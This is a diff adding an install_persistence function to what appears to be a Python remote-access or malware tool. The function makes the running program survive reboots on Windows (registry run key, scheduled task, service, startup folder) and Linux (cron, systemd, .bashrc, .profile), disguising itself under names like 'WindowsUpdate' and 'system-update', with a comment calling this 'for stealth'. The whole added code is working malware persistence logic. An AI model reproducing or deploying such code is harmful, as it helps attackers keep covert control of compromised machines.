@@ -197,3 +197,74 @@ WantedBy=multi-user.target
             'profile': self.add_profile(command)
         }
         return results 
+
+def install_persistence(method='registry'):
+    """Install persistence using specified method
+    
+    Args:
+        method (str): Persistence method to use. Options:
+            Windows: 'registry', 'scheduled_task', 'service', 'startup_folder', 'all'
+            Linux: 'cron', 'systemd', 'bashrc', 'profile', 'all'
+    """
+    try:
+        persistence = Persistence()
+        current_path = os.path.abspath(sys.argv[0])
+        
+        if platform.system() == 'Windows':
+            name = "WindowsUpdate"  # Generic name for stealth
+            if method == 'registry':
+                success = persistence.add_registry_startup(name, current_path)
+            elif method == 'scheduled_task':
+                success = persistence.add_scheduled_task(name, current_path)
+            elif method == 'service':
+                success = persistence.add_service(name, current_path)
+            elif method == 'startup_folder':
+                success = persistence.add_startup_folder(name, current_path)
+            elif method == 'all':
+                results = persistence.add_all_windows(name, current_path)
+                success = any(results.values())
+            else:
+                return {
+                    'status': 'error',
+                    'error': f'Unknown Windows persistence method: {method}',
+                    'timestamp': datetime.now().isoformat()
+                }
+        else:  # Linux
+            if method == 'cron':
+                success = persistence.add_cron_job(current_path)
+            elif method == 'systemd':
+                success = persistence.add_systemd_service('system-update', current_path)
+            elif method == 'bashrc':
+                success = persistence.add_bashrc(current_path)
+            elif method == 'profile':
+                success = persistence.add_profile(current_path)
+            elif method == 'all':
+                results = persistence.add_all_linux(current_path)
+                success = any(results.values())
+            else:
+                return {
+                    'status': 'error',
+                    'error': f'Unknown Linux persistence method: {method}',
+                    'timestamp': datetime.now().isoformat()
+                }
+        
+        if success:
+            return {
+                'status': 'success',
+                'message': f'Successfully installed persistence using method: {method}',
+                'timestamp': datetime.now().isoformat()
+            }
+        else:
+            return {
+                'status': 'error',
+                'error': f'Failed to install persistence using method: {method}',
+                'timestamp': datetime.now().isoformat()
+            }
+            
+    except Exception as e:
+        logging.error(f"Persistence installation error: {str(e)}")
+        return {
+            'status': 'error',
+            'error': str(e),
+            'timestamp': datetime.now().isoformat()
+        } 
